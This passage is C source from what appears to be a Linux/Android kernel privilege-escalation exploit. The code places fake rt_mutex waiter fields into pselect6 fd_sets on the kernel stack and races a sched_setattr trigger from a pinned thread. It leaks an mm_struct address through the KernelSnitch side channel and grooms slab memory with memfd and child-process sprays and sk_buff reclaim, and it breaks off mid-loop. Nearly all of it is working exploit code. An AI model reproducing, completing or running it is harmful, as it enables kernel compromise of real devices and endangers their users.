#include "common.h"
#include "kernelsnitch/kernelsnitch.h"

#if SLIDE_USE_PSELECT

#define SLIDE_PSELECT_PAD_BYTES 0
#ifndef SLIDE_PSELECT_WORD_SHIFT
#define SLIDE_PSELECT_WORD_SHIFT 0
#endif

int slide_pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (slide_route_nfds + bits_per_word - 1) / bits_per_word;
}

int slide_pselect_global_word(int waiter_word) {
  return SLIDE_PSELECT_WORD_SHIFT + waiter_word;
}

int slide_pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

void slide_pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int global_word = slide_pselect_global_word(waiter_word);
  int placed = slide_pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("slide pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               slide_route_nfds);
  }
}

void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  int words_per_set = slide_pselect_words_per_set();
#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
#if defined(PHYS_P0_ORACLE) && PHYS_P0_ORACLE
  uintptr_t stack_tree_parent = slide_oracle_parent;
  uintptr_t stack_tree_right = 0;
  uintptr_t stack_tree_left = slide_oracle_target;
  uintptr_t stack_pi_parent = slide_oracle_parent;
  uintptr_t stack_pi_right = 0;
  uintptr_t stack_pi_left = slide_oracle_target;
  uintptr_t stack_task = fake_task;
  slide_pselect_production_stack = 0;
#if defined(PRODUCTION_STACK_PI_RIGHT_ONLY) && \
    PRODUCTION_STACK_PI_RIGHT_ONLY
  if (slide_oracle_parent == fake_fops &&
      slide_oracle_target == data_addr(ASHMEM_MISC_FOPS)) {
    stack_pi_right = data_addr(ASHMEM_MISC_FOPS);
    stack_pi_left = 0;
    slide_pselect_production_stack = 1;
  }
#endif
#else
  slide_pselect_production_stack = 0;
#endif
#endif
  struct slide_waiter_word {
    int word;
    uint64_t value;
    const char *name;
  } words[] = {
#if LEGACY_RT_MUTEX_WAITER || COMPACT_RT_MUTEX_WAITER
#if defined(PHYS_P0_ORACLE) && PHYS_P0_ORACLE
#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
    {0, stack_tree_parent, "tree_pc"},
    {1, stack_tree_right, "tree_right"},
    {2, stack_tree_left, "tree_left"},
    {3, stack_pi_parent, "pi_pc"},
    {4, stack_pi_right, "pi_right"},
    {5, stack_pi_left, "pi_left"},
#else
    {0, slide_oracle_parent, "tree_pc"},
    {1, 0, "tree_right"},
    {2, slide_oracle_target, "tree_left"},
    {3, slide_oracle_parent, "pi_pc"},
    {4, 0, "pi_right"},
    {5, slide_oracle_target, "pi_left"},
#endif
#else
    {0, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "tree_pc"},
    {1, 0, "tree_right"},
    {2, SLIDE_WAITER_TREE_LEFT + slide_p0_offset, "tree_left"},
    {3, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "pi_pc"},
    {4, 0, "pi_right"},
    {5, SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset, "pi_left"},
#endif
#if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION && \
    defined(PHYS_P0_ORACLE) && PHYS_P0_ORACLE
    {6, stack_task, "task"},
#else
    {6, fake_task, "task"},
#endif
#else
    {6, SLIDE_WAITER_TASK + slide_p0_offset, "task"},
#endif
    {7, fake_lock, "lock"},
#if COMPACT_RT_MUTEX_WAITER
    {8, ((uint64_t)(uint32_t)FAKE_WAITER_PRIO << 32) |
            (uint32_t)SLIDE_WAITER_WAKE_STATE,
     "wake_state+prio"},
#else
    {8, FAKE_WAITER_PRIO, "prio"},
#endif
    {9, 0, "deadline"},
#if COMPACT_RT_MUTEX_WAITER
    {10, 0, "ww_ctx"},
#endif
#else
#if defined(PHYS_P0_ORACLE) && PHYS_P0_ORACLE
    {0, slide_oracle_parent, "tree_pc"},
    {1, 0, "tree_right"},
    {2, slide_oracle_target, "tree_left"},
    {3, FAKE_WAITER_PRIO, "tree_prio"},
    {5, slide_oracle_parent, "pi0"},
    {6, 0, "pi1"},
    {7, slide_oracle_target, "pi2"},
#else
    {0, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "tree_pc"},
    {1, 0, "tree_right"},
    {2, SLIDE_WAITER_TREE_LEFT + slide_p0_offset, "tree_left"},
    {3, FAKE_WAITER_PRIO, "tree_prio"},
    {5, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "pi0"},
    {6, 0, "pi1"},
    {7, SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset, "pi2"},
#endif
    {8, FAKE_WAITER_PRIO, "pi_prio"},
    {9, 0, "pi_deadline"},
#if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
    {10, fake_task, "task"},
#else
    {10, SLIDE_WAITER_TASK + slide_p0_offset, "task"},
#endif
    {11, fake_lock, "lock"},
#if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
    {12, 0, "wake_state"},
#else
    {12, SLIDE_WAITER_WAKE_STATE, "wake_state"},
#endif
    {13, 0, "ww_ctx"},
#endif
  };
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    struct slide_waiter_word *w = &words[i];
    slide_pselect_put_waiter_word(
        in, out, ex, words_per_set, w->word, w->value, w->name);
  }
}

void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
  for (int fd = 0; fd < slide_route_nfds; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(read_fd, fd);
    }
  }
}

#if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
static long slide_read_task_syscall_nr(int tid) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/self/task/%d/syscall", tid);
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return -1;
  }
  char buf[128];
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0) {
    return -1;
  }
  buf[n] = 0;
  char *end = NULL;
  errno = 0;
  long nr = strtol(buf, &end, 0);
  if (errno || end == buf) {
    return -1;
  }
  return nr;
}

static int slide_read_task_wchan(int tid, char *buf, size_t size) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/self/task/%d/wchan", tid);
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  ssize_t n = read(fd, buf, size - 1);
  close(fd);
  if (n <= 0) {
    return 0;
  }
  buf[n] = 0;
  char *newline = strchr(buf, '\n');
  if (newline) {
    *newline = 0;
  }
  return 1;
}

static int slide_task_blocked_in_pselect(int tid, char *wchan, size_t size) {
  if (slide_read_task_syscall_nr(tid) != SYS_pselect6 ||
      !slide_read_task_wchan(tid, wchan, size)) {
    return 0;
  }
  return strncmp(wchan, "do_select", strlen("do_select")) == 0;
}

static int slide_wait_for_pselect_blocked(int tid, size_t timeout_usec,
                                          int confirmations,
                                          size_t *elapsed_usec,
                                          char *last_wchan,
                                          size_t last_wchan_size) {
  size_t started = gettime_ns();
  size_t deadline = started + timeout_usec * 1000ULL;
  int synced = 0;
  while (gettime_ns() < deadline) {
    if (slide_task_blocked_in_pselect(tid, last_wchan,
                                      last_wchan_size)) {
      synced++;
      if (synced >= confirmations) {
        break;
      }
      usleep(100);
    } else {
      synced = 0;
      __asm__ volatile("yield" ::: "memory");
    }
  }
  if (elapsed_usec) {
    *elapsed_usec = (gettime_ns() - started) / 1000ULL;
  }
  return synced >= confirmations;
}
#endif

static useconds_t slide_enter_delay_usec(void) {
  const char *forced = getenv("SLIDE_ENTER_DELAY_USEC");
  if (!forced || !*forced) {
    forced = getenv("PSELECT_DELAY_USEC");
  }
  if (forced && *forced) {
    char *end = NULL;
    errno = 0;
    long value = strtol(forced, &end, 0);
    if (!errno && end != forced && !*end && value >= 0 && value <= 1000000) {
      return (useconds_t)value;
    }
  }
  return PSELECT_ENTER_DELAY_USEC;
}

void slide_pselect_stack_copy(void) {
  if (!page_base || !fake_lock || !fake_w0) {
    pr_error("slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
             page_base, fake_lock, fake_w0);
    return;
  }

  int pipefd[2] = {-1, -1};
  SYSCHK(pipe(pipefd));
  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  if (block_fd < 0) {
    pr_warning("slide timerfd_create failed errno=%d; using pipe read end\n",
               errno);
    block_fd = pipefd[0];
  }
  int high_read = fcntl(block_fd, F_DUPFD, slide_route_nfds + 16);
  if (high_read < 0) {
    pr_error("slide pselect F_DUPFD read errno=%d\n", errno);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);
    return;
  }

  fd_set in;
  fd_set out;
  fd_set ex;
  prepare_slide_pselect_fdsets(&in, &out, &ex);
  open_slide_selected_fds(&in, &out, &ex, high_read);

  slide_reset_consume_state();

  struct timespec timeout = {
#ifdef SLIDE_PSELECT_TIMEOUT_NSEC
    .tv_sec = 0,
    .tv_nsec = SLIDE_PSELECT_TIMEOUT_NSEC,
#else
    .tv_sec = PSELECT_TIMEOUT_SEC,
    .tv_nsec = 0,
#endif
  };
  struct timespec *timeoutp = &timeout;

  size_t pselect_started = gettime_ns();
#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
  atomic_store(&slide_pselect_started_ns, pselect_started);
#endif
  for (int index = 0; index < slide_route_syscall_pad; index++) {
    syscall(SYS_gettid);
  }
  atomic_store(&slide_consume_go, 1);
  errno = 0;
  int ret = (int)syscall(SYS_pselect6, slide_route_nfds,
                         &in, &out, &ex, timeoutp, NULL);
  int saved_errno = errno;
  size_t pselect_elapsed_usec =
      (gettime_ns() - pselect_started) / 1000ULL;
  atomic_store(&slide_consume_go, 0);

  if (atomic_load(&slide_consume_enter_sched) != 0 &&
      !atomic_load(&slide_consume_stop)) {
    size_t consume_deadline = gettime_ns() + 200000000ULL;
    while (!atomic_load(&slide_consume_stop) &&
           gettime_ns() < consume_deadline) {
      usleep(1000);
    }
  }

#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
  pr_info("slide pselect returned nfds=%d pad=%d prod_stack=%d "
          "ret=%d errno=%d "
          "elapsed_usec=%zu "
          "ready=%d seen=%d entered=%d calls=%d sched_ok=%d "
          "last_sched_ret=%d last_sched_errno=%d\n",
          slide_route_nfds, slide_route_syscall_pad,
          slide_pselect_production_stack, ret, saved_errno,
          pselect_elapsed_usec,
          atomic_load(&slide_consumer_ready),
          atomic_load(&slide_consume_seen),
          atomic_load(&slide_consume_enter_sched),
          atomic_load(&slide_consume_calls),
          atomic_load(&slide_consume_sched_ok),
          atomic_load(&slide_consume_last_sched_ret),
          atomic_load(&slide_consume_last_sched_errno));
#else
  pr_info("slide pselect returned nfds=%d pad=%d ret=%d errno=%d "
          "elapsed_usec=%zu "
          "ready=%d seen=%d entered=%d calls=%d sched_ok=%d "
          "last_sched_ret=%d last_sched_errno=%d\n",
          slide_route_nfds, slide_route_syscall_pad, ret, saved_errno,
          pselect_elapsed_usec,
          atomic_load(&slide_consumer_ready),
          atomic_load(&slide_consume_seen),
          atomic_load(&slide_consume_enter_sched),
          atomic_load(&slide_consume_calls),
          atomic_load(&slide_consume_sched_ok),
          atomic_load(&slide_consume_last_sched_ret),
          atomic_load(&slide_consume_last_sched_errno));
#endif
  atomic_store(&slide_stack_write_window,
               ret > 0 && atomic_load(&slide_consume_sched_ok) > 0);

  close(high_read);
  if (block_fd != pipefd[0]) {
    close(block_fd);
  }
  close(pipefd[0]);
  close(pipefd[1]);
}

void *slide_pselect_consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);
  atomic_store(&slide_consumer_ready, 1);
  int *errno_ptr = &errno;

  int seen = 0;
  for (;;) {
    int seq = atomic_load(&slide_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      if (atomic_load(&slide_consume_stop)) {
        return NULL;
      }
      continue;
    }

    seen = seq;
    atomic_store(&slide_consume_seen, seen);
    if (atomic_load(&slide_consume_go) != seq) {
      int lost = atomic_load(&slide_consume_lost) + 1;
      atomic_store(&slide_consume_lost, lost);
      continue;
    }

#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
    int tid = atomic_load(&slide_waiter_tid);
#if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
    int ready_ok = -1;
    int guard_ok = -1;
    size_t ready_elapsed_usec = 0;
    size_t guard_elapsed_usec = 0;
    uint64_t pselect_age_usec = 0;
    char ready_wchan[64] = "<not-read>";
    char guard_wchan[64] = "<not-read>";
#endif
    if (seq == 1) {
#if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
      ready_ok = slide_wait_for_pselect_blocked(
          tid, SLIDE_PSELECT_READY_TIMEOUT_USEC,
          SLIDE_PSELECT_WCHAN_CONFIRMATIONS, &ready_elapsed_usec,
          ready_wchan, sizeof(ready_wchan));
      if (!ready_ok) {
        pr_info("slide pselect ready=0 tid=%d elapsed_usec=%zu wchan=%s; "
                "trigger skipped\n",
                tid, ready_elapsed_usec, ready_wchan);
        atomic_store(&slide_consume_stop, 1);
        return NULL;
      }
#endif
      usleep(slide_enter_delay_usec());
#if defined(PSELECT_TRIGGER_MAX_AGE_USEC)
      uint64_t pselect_started_ns = atomic_load(&slide_pselect_started_ns);
      pselect_age_usec = pselect_started_ns
          ? (gettime_ns() - pselect_started_ns) / 1000ULL
          : UINT64_MAX;
      if (pselect_age_usec > PSELECT_TRIGGER_MAX_AGE_USEC) {
        pr_info("slide pselect age guard=0 tid=%d age_usec=%llu max=%d; "
                "trigger skipped\n",
                tid, (unsigned long long)pselect_age_usec,
                PSELECT_TRIGGER_MAX_AGE_USEC);
        atomic_store(&slide_consume_stop, 1);
        return NULL;
      }
#endif
#if defined(SLIDE_GUARD_PSELECT_SYSCALL) && SLIDE_GUARD_PSELECT_SYSCALL
      guard_ok = slide_wait_for_pselect_blocked(
          tid, SLIDE_PSELECT_RECHECK_TIMEOUT_USEC,
          SLIDE_PSELECT_WCHAN_CONFIRMATIONS, &guard_elapsed_usec,
          guard_wchan, sizeof(guard_wchan));
      if (!guard_ok) {
        pr_info("slide pselect blocked guard=0 tid=%d elapsed_usec=%zu "
                "wchan=%s; trigger skipped\n",
                tid, guard_elapsed_usec, guard_wchan);
        atomic_store(&slide_consume_stop, 1);
        return NULL;
      }
#endif
#if defined(PSELECT_POST_GUARD_AGE_CHECK) && \
    PSELECT_POST_GUARD_AGE_CHECK && \
    defined(PSELECT_TRIGGER_MAX_AGE_USEC)
      pselect_started_ns = atomic_load(&slide_pselect_started_ns);
      pselect_age_usec = pselect_started_ns
          ? (gettime_ns() - pselect_started_ns) / 1000ULL
          : UINT64_MAX;
      if (pselect_age_usec > PSELECT_TRIGGER_MAX_AGE_USEC) {
        pr_info("slide pselect post-guard age=0 tid=%d age_usec=%llu "
                "max=%d; trigger skipped\n",
                tid, (unsigned long long)pselect_age_usec,
                PSELECT_TRIGGER_MAX_AGE_USEC);
        atomic_store(&slide_consume_stop, 1);
        return NULL;
      }
#endif
    }
#else
    if (seq == 1) {
      usleep(slide_enter_delay_usec());
    }
    int tid = atomic_load(&slide_waiter_tid);
#endif

    int calls = atomic_load(&slide_consume_calls);
    int entered = atomic_load(&slide_consume_enter_sched) + 1;
    atomic_store(&slide_consume_enter_sched, entered);
    atomic_store(&slide_consume_calls, calls + 1);
    *errno_ptr = 0;
    long ret = sched_setattr_tid(tid, (calls % 19) + 1);
    int saved_errno = *errno_ptr;
#if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
    pr_info("slide pselect blocked ready=%d ready_usec=%zu ready_wchan=%s "
            "guard=%d guard_usec=%zu guard_wchan=%s age_usec=%llu tid=%d\n",
            ready_ok, ready_elapsed_usec, ready_wchan,
            guard_ok, guard_elapsed_usec, guard_wchan,
            (unsigned long long)pselect_age_usec, tid);
#endif
    atomic_store(&slide_consume_last_sched_ret, (int)ret);
    atomic_store(&slide_consume_last_sched_errno, saved_errno);
    if (ret == 0) {
      int sched_ok = atomic_load(&slide_consume_sched_ok) + 1;
      atomic_store(&slide_consume_sched_ok, sched_ok);
    }
    atomic_store(&slide_consume_stop, 1);
    while (atomic_load(&slide_consume_go)) {
      __asm__ volatile("yield" ::: "memory");
    }
    return NULL;
  }
}

/* --- Original prepare kernel page (uncontrolled mm spray for pselect) ----- */

#if defined(PHYS_VIRTUAL_BASE_ORACLE) && PHYS_VIRTUAL_BASE_ORACLE
static void cleanup_failed_kernel_page(const char *reason) {
  pr_info("kernel page cleanup failure=%s stage=kernelsnitch begin\n", reason);
  kernelsnitch_cleanup(ks);
  ks = NULL;
  pr_info("kernel page cleanup failure=%s stage=prepare-children begin count=%zu\n",
          reason, prepare_ctx.mm_cnt);
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    kill_child(prepare_ctx.childs[i]);
  }
  pr_info("kernel page cleanup failure=%s stage=prepare-children done\n", reason);
  cleanup_page_prepare_state();
}
#endif

uintptr_t prepare_kernel_page(int payload_mode) {
  close_reclaim_sockets();
#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
  cleanup_page_prepare_state();
#endif
  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
  prepare_ctxs();

  skb_buf = malloc(SKB_SEND_SIZE);
  memset(skb_buf, 0x41, SKB_SEND_SIZE);

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.childs[i] = clone_child();
  }
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
  }

  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    spray_ctx.childs[i] = clone_child();
    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
  }

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
      KERNELSNITCH_VERBOSE, KERNELSNITCH_MTE_ENABLED);
#if defined(KERNEL_PAGE_KSNITCH_IDENTITY_END) && \
    defined(KERNEL_PAGE_KSNITCH_EXACT_PARTITION)
  size_t search_min_object_index = FOPS_MIN_OBJECT_INDEX;
  size_t search_max_object_index = mm_objs_per_slab - 1;
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    search_min_object_index = SLIDE_MIN_OBJECT_INDEX;
    search_max_object_index = SLIDE_MAX_OBJECT_INDEX;
  }
  kernelsnitch_set_search_bounds(
      ks, KERNELSNITCH_IDENTITY_START,
      KERNEL_PAGE_KSNITCH_IDENTITY_END,
      search_min_object_index, search_max_object_index,
      KERNEL_PAGE_KSNITCH_EXACT_PARTITION);
#endif
  configure_kernelsnitch_profile(ks, payload_mode);
#else
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
#if defined(SLIDE_KSNITCH_APPENDED_FUTEXES)
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    kernelsnitch_set_profile(
        ks, SLIDE_KSNITCH_APPENDED_FUTEXES,
        SLIDE_KSNITCH_REPEAT_MEASUREMENT,
        SLIDE_KSNITCH_AVERAGE);
  }
#endif
#endif

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.childs[i] = clone_child();
  }
  child_leak = clone_leak_child();
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.childs[i] = clone_child();
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
  }
  memfd_leak = open_memfd(child_leak);
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    kill_child(pre_ctx.childs[i]);
  }
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    kill_child(post_ctx.childs[i]);
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    kill_child(spray_ctx.childs[i]);
  }
  SYSCHK(waitpid(child_leak, NULL, 0));
#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
  log_mm_slabinfo("after-child-exit");
#endif

  if (!kernelsnitch_found_collisions(ks)) {
    pr_warning("KernelSnitch collision finding failed\n");
#if defined(PHYS_VIRTUAL_BASE_ORACLE) && PHYS_VIRTUAL_BASE_ORACLE
    cleanup_failed_kernel_page("collision");
#else
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
#endif
    return 0;
  }

  kernelsnitch_bruteforce(ks);
  uintptr_t leaked = ks->mm_struct;
  if (leaked == (uintptr_t)-1) {
    pr_warning("KernelSnitch mm_struct leak failed\n");
#if defined(PHYS_VIRTUAL_BASE_ORACLE) && PHYS_VIRTUAL_BASE_ORACLE
    cleanup_failed_kernel_page("mm-leak");
#else
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
#endif
    return 0;
  }
#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
  leaked = canonicalize_kernelsnitch_pointer(leaked);
  log_mm_slabinfo("after-leak");
#endif

  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
  size_t object_index = (leaked - base) / MM_STRUCT_SZ;
  pr_info("mm leaked=%016zx base=%016zx object_index=%zu\n",
          leaked, base, object_index);
#if defined(RECLAIM_MAX_DIRECT_BASE)
  if (base >= RECLAIM_MAX_DIRECT_BASE) {
    pr_warning("mm reclaim candidate rejected mode=%d base=%016zx max=%016llx\n",
               payload_mode, base,
               (unsigned long long)RECLAIM_MAX_DIRECT_BASE);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }
#endif
#if defined(SLIDE_MIN_OBJECT_INDEX)
  if (payload_mode == PAGE_PAYLOAD_SLIDE &&
      object_index < SLIDE_MIN_OBJECT_INDEX) {
    pr_warning("mm slide candidate rejected object_index=%zu min=%d\n",
               object_index, SLIDE_MIN_OBJECT_INDEX);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }
#endif
#if defined(SLIDE_MAX_OBJECT_INDEX)
  if (payload_mode == PAGE_PAYLOAD_SLIDE &&
      object_index > SLIDE_MAX_OBJECT_INDEX) {
    pr_warning("mm slide candidate rejected object_index=%zu max=%d\n",
               object_index, SLIDE_MAX_OBJECT_INDEX);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }
#endif
#if defined(FOPS_MIN_OBJECT_INDEX)
  if (payload_mode == PAGE_PAYLOAD_FOPS &&
      object_index < FOPS_MIN_OBJECT_INDEX) {
    pr_warning("mm fops candidate rejected object_index=%zu min=%d\n",
               object_index, FOPS_MIN_OBJECT_INDEX);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }
#endif
#else
  pr_info("mm leaked=%016zx base=%016zx object_index=%zu\n",
          leaked, base, (leaked - base) / MM_STRUCT_SZ);
#endif
  if (!prepare_skb_payload(base, payload_mode)) {
#if defined(PHYS_VIRTUAL_BASE_ORACLE) && PHYS_VIRTUAL_BASE_ORACLE
    cleanup_failed_kernel_page("skb-payload");
#else
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
#endif
    return 0;
  }

  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
#ifdef SLIDE_RECLAIM_SNDBUF
  int sndbuf = SLIDE_RECLAIM_SNDBUF;
#else
  int sndbuf = 1 << 20;
#endif
  errno = 0;
  int sndbuf_set_ret =
      setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf,
                 sizeof(sndbuf));
  int sndbuf_set_errno = errno;
  socklen_t sndbuf_len = sizeof(sndbuf);
  int sndbuf_effective = 0;
  errno = 0;
  int sndbuf_get_ret =
      getsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf_effective,
                 &sndbuf_len);
  int sndbuf_get_errno = errno;
  pr_info("sk_buff reclaim sndbuf request=%d effective=%d "
          "set_ret=%d set_errno=%d get_ret=%d get_errno=%d\n",
          sndbuf, sndbuf_effective, sndbuf_set_ret, sndbuf_set_errno,
          sndbuf_get_ret, sndbuf_get_errno);
#else
  int sndbuf = 1 << 20;
  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
#endif
  int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
  if (reclaim_flags >= 0) {
    fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
  }
  int pcp_shaping_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = skb_buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));
#if defined(QUIET_RECLAIM_WINDOW) && QUIET_RECLAIM_WINDOW
  SYSCHK(fflush(NULL));
#endif

  pin_to_core(CORE);
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
    SYSCHK(close(spray_ctx.memfds[i]));
    spray_ctx.memfds[i] = -1;
  }
  size_t target_pre = pre_ctx.mm_cnt - 1;
  SYSCHK(close(pre_ctx.memfds[target_pre]));
  pre_ctx.memfds[target_pre] = -1;
  SYSCHK(close(post_ctx.memfds[0]));
  post_ctx.memfds[0] = -1;
#if !(defined(QUIET_RECLAIM_WINDOW) && QUIET_RECLAIM_WINDOW)
  pr_info("mm target-neighbor slab queued for late drain\n");
#endif
  for (size_t i = 0; i < target_pre; i++) {
    SYSCHK(close(pre_ctx.memfds[i]));
    pre_ctx.memfds[i] = -1;
  }
  for (size_t i = 1; i < post_ctx.mm_cnt - 1; i++) {
    SYSCHK(close(post_ctx.memfds[i]));
    post_ctx.memfds[i] = -1;
  }
#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION && \
    !(defined(QUIET_RECLAIM_WINDOW) && QUIET_RECLAIM_WINDOW)
  log_mm_slabinfo("after-target-neighbors");
#endif

  SYSCHK(close(pcp_shaping_sv[0]));
  SYSCHK(close(pcp_shaping_sv[1]));
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  SYSCHK(close(memfd_leak));
  memfd_leak = -1;
  size_t drain_triggers = prepare_ctx.mm_cnt / mm_objs_per_slab;
#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
#ifdef MM_LATE_DRAIN_TRIGGERS
  drain_triggers = MM_LATE_DRAIN_TRIGGERS;
#endif
  pid_t deferred_reap_children[drain_triggers ? drain_triggers : 1];
  size_t deferred_reap_count = 0;
  memset(deferred_reap_children, 0, sizeof(deferred_reap_children));
#endif
  for (size_t i = 0; i < drain_triggers; i++) {
